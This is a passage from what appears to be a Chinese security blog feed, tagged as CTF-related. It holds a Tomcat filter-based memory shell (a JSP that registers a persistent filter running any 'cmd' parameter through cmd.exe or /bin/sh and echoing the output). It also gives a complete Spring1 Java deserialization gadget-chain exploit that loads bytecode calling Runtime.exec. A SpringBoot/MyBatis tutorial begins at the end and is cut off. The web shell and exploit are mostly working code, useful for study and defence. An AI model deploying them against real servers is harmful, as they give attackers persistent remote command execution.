class_">CmdFilter</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">        filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(cmdFilter);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        context.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(context);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;CmdFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>执行成功，理论上任意界面存在cmd参数都可执行，且在jsp文件删除后依然有效</p><p><img src="/img/post/mem5.png" alt="mem5"></p><h2 id="内存马回显技术"><a href="#内存马回显技术" class="headerlink" title="内存马回显技术"></a>内存马回显技术</h2><p>采用输入输出流进行页面打印</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>对于Linux系统，<code>ProcessBuilder</code>的参数为<code>(&quot;/bin/sh&quot;, &quot;-h&quot;, cmd)</code></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring1原生反序列化链</title>
      <link href="/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring1原生反序列化链"><a href="#Spring1原生反序列化链" class="headerlink" title="Spring1原生反序列化链"></a>Spring1原生反序列化链</h1><p>Spring1原生链的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Spring1链最终通过<code>Templates</code>类的<code>newTransformer()</code>方法动态加载恶意类执行命令，核心点在于前部分<strong>三层动态代理</strong>的嵌套使用，这里采用顺推</p><p>首先看入口类<code>MethodInvokeTypeProvider</code>，它是抽象类<code>SerializableTypeWrapper</code>下的静态类，其<code>readObject()</code>如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            inputStream.defaultReadObject();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">            <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们的目标是<code>method</code>为<code>&quot;newTransformer&quot;</code>，<code>this.provider.getType()</code>返回构造的<code>Templates</code>对象，那么<code>provider</code>肯定是一个代理对象了，问题是处理器得选谁，经过前面CC1的学习，<code>AnnotationInvocationHandler</code>类的invoke()方法可以做到返回特定的对象，那是否可以直接把<code>Templates</code>作为结果返回呢？不可以，因为<code>getType()</code>方法要求返回一个<code>Type</code>对象，直接返回<code>Templates</code>会转型失败报错，所以此处应再返一个代理对象，且代理对象实现了<code>Type</code>接口</p><p>ysoserial的源码告诉我们第二层代理的处理器应选择抽象类<code>AutowriteUtils</code>下的<code>ObjectFactoryDelegatingInvocationHandler</code>，它的<code>invoke()</code>方法如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>由于<code>method</code>是从<code>readObject()</code>里传递的<code>&quot;newTransformer&quot;</code>，也就是说<code>readObject()</code>并不是直接触发<code>newTransformer()</code>的方法，而是<code>ObjectFactoryDelegatingInvocationHandler</code>的<code>invoke()</code>，这个类的特别之处在于其invoke()方法中再一次调用了一个方法<code>getObject()</code>，并且触发的对象<code>this.objectFactory</code>是可控的。那么我们让<code>this.objectFactory</code>再次作为代理对象，处理器是<code>AnnotationInvocationHandler</code>，让其触发<code>getObject()</code>时返回真正的<code>Templates</code>即可，以下是前半部分的利用链</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">this.provider.getType()</span><br><span class="line">&gt;$Proxy0.getType()</span><br><span class="line">&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">    &gt;$Proxy1.newTransformer()</span><br><span class="line">    &gt;ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">    &gt;newTransformer.invoke(this.objectFactory.getObject(), null)</span><br><span class="line">    &gt;newTransformer.invoke($Proxy2.getObject(), null)</span><br><span class="line">        &gt;newTransformer.invoke(AnnotationInvocationHandler.invoke(), null)</span><br><span class="line">        &gt;newTransformer.invoke(Templates, null)</span><br><span class="line">            &gt;Templates.newTransformer()</span><br></pre></td></tr></table></figure><p>接下来构造链，前面是构造动态加载恶意类和<code>Templates</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">spring.setSuperclass(superClass);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br></pre></td></tr></table></figure><p>构造第一层代理，在调用<code>getObject()</code>方法时返回<code>templates</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br></pre></td></tr></table></figure><p>构造第二层代理，在调用<code>newTransformer()</code>方法时去调用第一层代理的<code>getObject()</code>方法，故要让<code>objectFactory</code>属性为前面构造的<code>handler01</code>，并且该代理对象同时实现<code>Type</code>和<code>Templates</code>接口以满足返回值要求和<code>newTransformer()</code>方法的响应</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line"><span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br></pre></td></tr></table></figure><p>构造第三层代理，在调用<code>getType()</code>方法时返回<code>proxy02</code>，由于<code>TypeProvider</code>接口为包私有，需要先直接获取类，再传入，同时代理对象<code>proxy03</code>也是只能声明为<code>Object</code>类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br></pre></td></tr></table></figure><p>由于入口类是<code>MethodInvokeTypeProvider</code>，我们要创建该类实例，并让<code>this.methodName</code>为<code>&quot;newTransformer&quot;</code>，构造器需要一个<code>Method</code>对象，先随便传，后面再通过反射修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>至此，Spring1原生反序列化链构建完毕，全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringSerialTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        spring.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">        constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">        ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">        constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line">        <span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(methodInvokeTypeProvider);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot第二部分</title>
      <link href="/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/"/>
      <url>/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBoot第二部分"><a href="#SpringBoot第二部分" class="headerlink" title="SpringBoot第二部分"></a>SpringBoot第二部分</h1><br/><h2 id="Mybatis框架集成"><a href="#Mybatis框架集成" class="headerlink" title="Mybatis框架集成"></a>Mybatis框架集成</h2><p>Mybatis是作用于持久层的的框架，主要与数据库进行交互，可以简化程序编写时与数据库的交互</p><h3 id="配置与实现"><a href="#配置与实现" class="headerlink" title="配置与实现"></a>配置与实现</h3><p>配置依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis 集成 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- springboot 分页插件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- mysql 驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- c3p0 数据源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置<code>application.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据源配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span 